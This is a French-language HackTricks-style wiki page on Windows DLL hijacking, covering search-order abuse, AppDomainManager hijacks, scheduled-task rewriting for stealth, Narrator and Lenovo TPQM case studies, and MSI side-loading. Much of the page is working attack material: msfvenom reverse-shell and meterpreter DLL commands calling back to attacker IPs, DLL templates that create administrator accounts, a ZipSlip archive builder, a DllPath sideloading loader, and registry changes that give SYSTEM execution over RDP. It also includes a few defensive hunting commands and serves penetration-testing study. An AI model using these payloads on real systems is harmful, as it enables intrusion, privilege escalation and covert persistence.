# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking implique de manipuler une application de confiance afin qu’elle charge une DLL malveillante. Ce terme regroupe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour l’exécution de code, la persistence, et, plus rarement, l’élévation de privilèges. Malgré l’accent mis ici sur l’escalation, la méthode de hijacking reste la même quel que soit l’objectif.

### Common Techniques

Plusieurs méthodes sont employées pour le DLL hijacking, chacune avec son efficacité selon la stratégie de chargement des DLL par l’application :

1. **DLL Replacement** : Remplacer une DLL légitime par une malveillante, éventuellement en utilisant DLL Proxying pour conserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche prioritaire avant celle légitime, en exploitant le schéma de recherche de l’application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante pour qu’une application la charge en pensant qu’il s’agit d’une DLL requise qui n’existe pas.
4. **DLL Redirection** : Modifier des paramètres de recherche comme `%PATH%` ou des fichiers `.exe.manifest` / `.exe.local` pour diriger l’application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Remplacer la DLL légitime par une version malveillante dans le répertoire WinSxS, une méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l’utilisateur avec l’application copiée, ce qui ressemble aux techniques de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Le classic DLL sideloading n’est pas la seule manière de faire charger du code attaquant par un processus **.NET Framework** de confiance. Si l’exécutable cible est une application **managed**, le CLR consulte aussi un **application configuration file** nommé d’après l’exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si la config pointe vers un assembly contrôlé par l’attaquant placé à côté du EXE, le CLR le charge **avant le chemin normal du code de l’application** et l’exécute dans le processus de confiance.

Selon le schéma de configuration .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le manager personnalisé soit utilisé.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gestionnaire minimal :
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notes pratiques :
- Ceci est une technique spécifique à **.NET Framework**. Elle dépend de l’analyse de la configuration du CLR, pas de l’ordre de recherche des DLL de Win32.
- L’hôte doit vraiment être un **managed EXE**. Vérification rapide : `sigcheck -m target.exe`, `corflags target.exe`, ou rechercher le **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de configuration doit correspondre exactement au nom de l’exécutable (`<binary>.config`) et se trouver généralement **à côté du EXE**.
- C’est utile avec des binaires **signés Microsoft/vendor** parce que le EXE de confiance reste intact tandis que l’assembly managé malveillant s’exécute dans le même processus.
- Si vous avez déjà un répertoire d’installation/mise à jour inscriptible, AppDomainManager hijacking peut servir de **première étape**, suivi de classic DLL sideloading ou reflective loading pour les étapes suivantes.

### Hijacking d’une tâche planifiée existante pour relancer la chaîne de sideloading

Pour la persistance, ne cherchez pas seulement à **créer une nouvelle tâche**. Certains intrusion sets attendent qu’un installateur légitime crée une **tâche normale de mise à jour** puis **réécrivent l’action de la tâche** afin que le nom, l’auteur et le déclencheur existants restent familiers aux défenseurs.

Workflow réutilisable :
1. Installez/exécutez le logiciel légitime et identifiez la tâche qu’il crée normalement.
2. Exportez le XML de la tâche et notez les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.
3. Remplacez uniquement l’action pour que la tâche lance votre **trusted host EXE** depuis un répertoire de staging inscriptible par l’utilisateur, lequel fera ensuite du side-load ou du AppDomain-load du payload réel.
4. Réenregistrez le même nom de tâche au lieu de créer un nouvel artefact de persistance évident.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Pourquoi c’est plus furtif :
- Le nom de la tâche peut toujours paraître légitime (par exemple un vendor updater).
- Le **Task Scheduler service** la lance, donc la validation parent/ancestor voit souvent la chaîne de scheduling attendue au lieu de `explorer.exe`.
- Les équipes DFIR qui ne cherchent que les **nouveaux noms de tâches** peuvent manquer une tâche dont l’enregistrement existait déjà mais dont l’action pointe maintenant vers `%LOCALAPPDATA%`, `%APPDATA%` ou un autre chemin contrôlé par l’attaquant.

Pivots de chasse rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparez les métadonnées XML de `C:\Windows\System32\Tasks\*` et `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` à une baseline.
- Déclenchez une alerte lorsqu’une **vendor-looking updater task** s’exécute depuis des **user-writable directories** ou lance un EXE .NET avec un fichier `*.config` placé à côté.

> [!TIP]
> Pour une chaîne étape par étape qui superpose du HTML staging, des configs AES-CTR et des implants .NET au-dessus de DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La façon la plus courante de trouver des Dlls manquantes dans un système est de lancer [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) depuis sysinternals, **en définissant** les **2 filtres suivants** :

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

et en affichant seulement **File System Activity** :

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Si vous cherchez des **missing dlls en général**, laissez cela tourner pendant quelques **secondes**.\
Si vous cherchez un **missing dll dans un exécutable spécifique**, vous devriez ajouter **un autre filtre comme "Process Name" "contains" `<exec name>`, l’exécuter, puis arrêter la capture des événements**.

## Exploiting Missing Dlls

Afin d’élever les privilèges, la meilleure option est de pouvoir **écrire une dll qu’un processus privilégié essaiera de charger** dans un emplacement où elle va être recherchée. Ainsi, nous pourrons **écrire** une dll dans un **dossier** où la dll est recherchée **avant** le dossier où se trouve la **dll originale** (cas étrange), ou bien nous pourrons **écrire** dans un dossier où la dll va être recherchée et où la **dll originale** n’existe dans aucun dossier.

### Dll Search Order

**Dans la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez voir comment les Dlls sont chargées précisément.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, selon une séquence particulière. Le problème du DLL hijacking apparaît lorsqu’une DLL malveillante est placée stratégiquement dans l’un de ces répertoires, garantissant qu’elle sera chargée avant la DLL authentique. Une solution pour l’éviter consiste à s’assurer que l’application utilise des chemins absolus lorsqu’elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir l’**ordre de recherche des DLL sur les systèmes 32-bit** ci-dessous :

1. Le répertoire à partir duquel l’application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16-bit. Il n’existe pas de fonction qui obtienne le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires listés dans la variable d’environnement PATH. Notez que cela n’inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n’est pas utilisée lors du calcul du chemin de recherche des DLL.

C’est l’ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu’il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la à 0 (la valeur par défaut est activée).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu’**une dll peut être chargée en indiquant le chemin absolu plutôt que seulement le nom**. Dans ce cas, cette dll ne sera **recherchée que dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si elles avaient été chargées par nom).

Il existe d’autres moyens de modifier l’ordre de recherche, mais je ne vais pas les expliquer ici.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Utilisez les filtres **ProcMon** (`Process Name` = target EXE, `Path` se termine par `.dll`, `Result` = `NAME NOT FOUND`) pour collecter les noms de DLL que le processus tente de charger mais ne trouve pas.
2. Si le binaire s’exécute via une **schedule/service**, déposer une DLL portant l’un de ces noms dans le **application directory** (entrée #1 de l’ordre de recherche) sera chargé au prochain lancement. Dans un cas de scanner .NET, le processus cherchait `hostfxr.dll` dans `C:\samples\app\` avant de charger la vraie copie depuis `C:\Program Files\dotnet\fxr\...`.
3. Construisez une DLL payload (par exemple reverse shell) avec n’importe quel export : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est un **ZipSlip-style arbitrary write**, fabriquez un ZIP dont l’entrée échappe au répertoire d’extraction afin que la DLL atterrisse dans le dossier de l’application :
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Livrez l’archive à la boîte de réception/le partage surveillé ; lorsque la tâche planifiée relance le processus, il charge la DLL malveillante et exécute votre code en tant que compte de service.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une façon avancée d’influencer de manière déterministe le chemin de recherche des DLL d’un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l’attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les flags de chargement sûrs) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Key idea
- Construisez les paramètres du processus avec RtlCreateProcessParametersEx et fournissez un DllPath personnalisé pointant vers votre dossier contrôlé (par exemple, le répertoire où se trouve votre dropper/unpacker).
- Créez le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par son nom, le loader consultera ce DllPath fourni pendant la résolution, ce qui permet un sideloading fiable même lorsque la DLL malveillante n’est pas située à côté de l’EXE cible.

Notes/limitations
- Cela affecte le processus enfant en cours de création ; c’est différent de SetDllDirectory, qui n’affecte que le processus courant.
- La cible doit importer ou LoadLibrary une DLL par son nom (sans chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et les chemins absolus codés en dur ne peuvent pas être hijacked. Les exports relayés et SxS peuvent modifier la priorité.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d’utilisation opérationnelle
- Placez un xmllite.dll malveillant (exportant les fonctions requises ou faisant du proxy vers le vrai) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom en utilisant la technique ci-dessus. Le loader résout l’import via le DllPath fourni et sideload your DLL.

Cette technique a été observée in-the-wild pour piloter des chaînes de sideloading multi-étapes : un launcher initial dépose un helper DLL, qui lance ensuite un binaire Microsoft-signed, hijackable, avec un DllPath personnalisé pour forcer le chargement de la DLL de l’attaquant depuis un répertoire de staging.


#### Exceptions on dll search order from Windows docs

Certaines exceptions à l’ordre standard de recherche des DLL sont signalées dans la documentation Windows :

- Lorsqu’un **DLL qui partage son nom avec un autre déjà chargé en mémoire** est rencontré, le système contourne la recherche habituelle. À la place, il vérifie la redirection et un manifest avant de se rabattre sur le DLL déjà en mémoire. **Dans ce scénario, le système n’effectue pas de recherche du DLL**.
- Dans les cas où le DLL est reconnu comme un **known DLL** pour la version actuelle de Windows, le système utilisera sa version du known DLL, ainsi que tous ses DLL dépendants, **sans effectuer le processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient une liste de ces known DLLs.
- Si un **DLL a des dépendances**, la recherche de ces DLL dépendants est effectuée comme s’ils n’étaient indiqués que par leurs **noms de module**, indépendamment du fait que le DLL initial ait été identifié via un chemin complet.

### Escalating Privileges

**Requirements**:

- Identifier un processus qui fonctionne ou fonctionnera sous **des privilèges différents** (mouvement horizontal ou latéral), et qui **manque d’un DLL**.
- S’assurer qu’un **accès en écriture** est disponible pour tout **répertoire** dans lequel le **DLL** sera **recherché**. Cet emplacement peut être le répertoire de l’exécutable ou un répertoire dans le chemin système.

Oui, les prérequis sont compliqués à trouver, car **par défaut, c’est assez bizarre de trouver un exécutable privilégié auquel il manque un dll** et c’est encore **plus bizarre d’avoir des permissions d’écriture sur un dossier du chemin système** (ce n’est pas possible par défaut). Mais, dans des environnements mal configurés, c’est possible.\
Si vous avez de la chance et que vous remplissez les prérequis, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est de bypass UAC**, vous pourrez y trouver un **PoC** de Dll hijaking pour la version Windows que vous pouvez utiliser (en changeant probablement simplement le chemin du dossier où vous avez des permissions d’écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez aussi vérifier les imports d’un exécutable et les exports d’un dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la façon d'**abuser de Dll Hijacking pour élever les privilèges** avec des permissions d'écriture dans un dossier **System Path**, consultez :

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)vérifiera si vous avez des permissions d'écriture sur n'importe quel dossier à l'intérieur du system PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Example

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer un dll qui exporte au moins toutes les fonctions que l'exécutable importera depuis lui**. Quoi qu'il en soit, notez que Dll Hijacking est très utile pour [passer de Medium Integrity level à High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**High Integrity à SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer un dll valide** dans cette étude sur dll hijacking axée sur l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous pouvez trouver du **code dll basique** qui peut être utile comme **modèles** ou pour créer un **dll avec les fonctions requises exportées**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

En gros, un **Dll proxy** est un Dll capable d'**exécuter votre code malveillant lorsqu'il est chargé** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels vers la vraie bibliothèque**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxifier et **générer un dll proxifié** ou **indiquer le Dll** et **générer un dll proxifié**.

### **Meterpreter**

**Obtenir un rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n’ai pas vu de version x64) :**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, le Dll que vous compilez doit **exporter plusieurs fonctions** qui vont être chargées par le processus victime, si ces fonctions n'existent pas le **binary won't be able to load** them et l'**exploit will fail**.

<details>
<summary>Modèle de C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d'utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternatif avec entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe interroge toujours, au démarrage, une DLL de localization spécifique à la langue et prévisible, qui peut être hijacked pour exécution de code arbitraire et persistence.

Points clés
- Chemin sondé (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin legacy (anciennes versions) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL attaquante inscriptible existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s’exécute. Aucun export n’est requis.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci-dessus.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- Un hijack naïf parlera/mettra en surbrillance l’UI. Pour rester silencieux, à l’attache énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et appelez `SuspendThread` dessus ; continuez dans votre propre thread. Voir le PoC pour le code complet.

Déclenchement et persistence via la configuration Accessibility
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, le lancement de Narrator charge la DLL plantée. Sur le secure desktop (écran de logon), appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le secure desktop.

Exécution SYSTEM déclenchée par RDP (mouvement latéral)
- Autorisez la classic RDP security layer : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP vers l’hôte, à l’écran de logon appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le secure desktop.
- L’exécution s’arrête lorsque la session RDP se ferme — injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d’un Accessibility Tool (AT) intégré (par ex. CursorIndicator), la modifier pour pointer vers un binaire/DLL arbitraire, l’importer, puis définir `configuration` sur ce nom d’AT. Cela proxifie l’exécution arbitraire sous le framework Accessibility.

Notes
- Écrire sous `%windir%\System32` et modifier des valeurs HKLM nécessite des droits admin.
- Toute la logique du payload peut vivre dans `DLL_PROCESS_ATTACH`; aucun export n’est nécessaire.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Cette étude montre **Phantom DLL Hijacking** dans Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), suivie comme **CVE-2025-1729**.

### Vulnerability Details

- **Component** : `TPQMAssistant.exe` situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s’exécute chaque jour à 9:30 AM sous le contexte de l’utilisateur connecté.
- **Directory Permissions** : inscriptible par `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
- **DLL Search Behavior** : tente d’abord de charger `hostfxr.dll` depuis son répertoire de travail et journalise "NAME NOT FOUND" s’il est absent, ce qui indique une priorité de recherche du répertoire local.

### Exploit Implementation

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire, exploitant la DLL manquante pour obtenir l’exécution de code sous le contexte de l’utilisateur :
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. En tant qu'utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendez que la tâche planifiée s'exécute à 9:30 AM dans le contexte de l'utilisateur actuel.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité moyenne.
4. Enchaînez des techniques standard de contournement UAC pour élever l'intégrité moyenne vers des privilèges SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les threat actors associent fréquemment des droppers basés sur MSI avec du DLL side-loading pour exécuter des payloads sous un processus de confiance, signé.

Vue d'ensemble de la chaîne
- L'utilisateur télécharge le MSI. Une CustomAction s'exécute silencieusement pendant l'installation GUI (par ex. LaunchApplication ou une action VBScript), en reconstruisant l'étape suivante à partir de ressources intégrées.
- Le dropper écrit un EXE légitime et signé ainsi qu'une DLL malveillante dans le même répertoire (paire d'exemple : wsc_proxy.exe signé par Avast + wsc.dll contrôlée par l'attaquant).
- Lorsque l'EXE signé est lancé, l'ordre de recherche des DLL de Windows charge d'abord wsc.dll depuis le répertoire de travail, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

Analyse MSI (quoi rechercher)
- Table CustomAction :
- Recherchez les entrées qui lancent des exécutables ou du VBScript. Exemple de pattern suspect : LaunchApplication exécutant un fichier intégré en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés/séparés dans le CAB du MSI :
- Extraction administrative : `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Ou utilisez lessmsi : `lessmsi x package.msi C:\out`
- Recherchez plusieurs petits fragments qui sont concaténés et déchiffrés par une CustomAction VBScript. Flux courant :
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe : hôte légitime signé (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
- wsc.dll : DLL de l’attaquant. Si aucune exportation spécifique n’est requise, DllMain peut suffire ; sinon, construisez une DLL proxy et transférez les exportations requises vers la bibliothèque authentique tout en exécutant la payload dans DllMain.
- Construisez une DLL payload minimale :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d'export, utilisez un proxying framework (par exemple, DLLirant/Spartacus) pour générer une DLL de forwarding qui exécute aussi votre payload.

